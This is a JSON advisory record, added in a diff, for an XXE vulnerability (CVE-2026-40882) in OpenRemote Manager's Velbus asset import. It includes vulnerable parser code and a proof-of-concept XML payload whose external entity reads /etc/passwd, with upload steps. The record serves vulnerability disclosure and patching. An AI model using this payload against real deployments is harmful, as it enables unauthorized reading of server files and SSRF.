@@ -1,0 +1,50 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-04-15T19:42:25Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.openremote:openremote-manager"
+  },
+  "Advisory": {
+    "DatabaseId": 349536,
+    "Id": "GSA_kwCzR0hTQS1nMjRmLW1nYzMtand3Y84ABVVg",
+    "GhsaId": "GHSA-g24f-mgc3-jwwc",
+    "References": [
+      {
+        "Url": "https://github.com/openremote/openremote/security/advisories/GHSA-g24f-mgc3-jwwc"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-g24f-mgc3-jwwc"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-g24f-mgc3-jwwc"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-40882"
+      }
+    ],
+    "Description": "### Summary\nThe Velbus asset import path parses attacker-controlled XML without explicit XXE hardening. An authenticated user who can call the import endpoint may trigger XML external entity processing, which can lead to server-side file disclosure and SSRF. The target file must be less than 1023 characters.\n\n### Details\nVelbus import uses `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(...)` on untrusted XML input, without explicit safeguards to disable DTD/external entities.\n\n```154:165:agent/src/main/java/org/openremote/agent/protocol/velbus/AbstractVelbusProtocol.java\n    @Override\n    public Future\u003cVoid\u003e startAssetImport(byte[] fileData, Consumer\u003cAssetTreeNode[]\u003e assetConsumer) {\n\n        return executorService.submit(() -\u003e {\n            Document xmlDoc;\n            try {\n                String xmlStr = new String(fileData, StandardCharsets.UTF_8);\n                LOG.info(\"Parsing VELBUS project file\");\n\n                xmlDoc = DocumentBuilderFactory\n                    .newInstance()\n                    .newDocumentBuilder()\n                    .parse(new InputSource(new StringReader(xmlStr)));\n```\n\nExpanded `Caption` content is propagated into created asset names:\n\n```193:198:agent/src/main/java/org/openremote/agent/protocol/velbus/AbstractVelbusProtocol.java\n                String name = module.getElementsByTagName(\"Caption\").item(0).getTextContent();\n                name = isNullOrEmpty(name) ? deviceType.toString() : name;\n\n                // TODO: Use device specific asset types\n                Asset\u003c?\u003e device = new ThingAsset(name);\n```\n\n### PoC\n1. Log in to a realm with a user that can call Velbus asset import.\n2. Create/select a Velbus TCP Agent in that same realm.\n3. Send `POST /api/{realm}/agent/assetImport/{agentId}` with a Velbus project XML payload and compare behavior against a baseline import file.\n3. Save the below code as a `xxe.xml` and upload to `Setup` under `https://localhost/manager/?realm=\u003cYOUR_REALM\u003e#/assets/false/\u003cASSET_ID\u003e`. Chnage the `file:///etc/passwd` to another file if your `passwd` is longer than 1023 characters.\n```xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE velbus [\n  \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e\n]\u003e\n\u003cProject\u003e\n  \u003cModule type=\"VMB1RY\" address=\"01\" build=\"00\" serial=\"LAB\"\u003e\n    \u003cCaption\u003e\u0026xxe;\u003c/Caption\u003e\n  \u003c/Module\u003e\n\u003c/Project\u003e\n```\n\nAs long as the file content is under 1023 characters, the exploit will succeed.\n\u003cimg width=\"1200\" height=\"662\" alt=\"image\" src=\"https://github.com/user-attachments/assets/213f063d-98b6-4717-b98c-f4255952026b\" /\u003e\n\nIf the file content reaches the limit, an error is thrown.\n\u003cimg width=\"1200\" height=\"630\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ee177a6b-2cb2-48ae-94df-c994ecb41429\" /\u003e\n\n\n### Impact\n- **Type:** XML External Entity (XXE)\n- **Affected:** Deployments exposing Velbus import to authenticated users with import access\n- **Risk:** limited local file disclosure (as long as the file is under 1023 characters) from the Manager runtime, and SSRF.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-15T19:42:23Z",
+    "Severity": "HIGH",
+    "Summary": "OpenRemote has XXE in Velbus Asset Import",
+    "UpdatedAt": "2026-04-15T21:17:56Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.6,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.22.0"
+      },
+      "VulnerableVersionRange": "\u003c= 1.21.0"
+    }
+  ]
+}
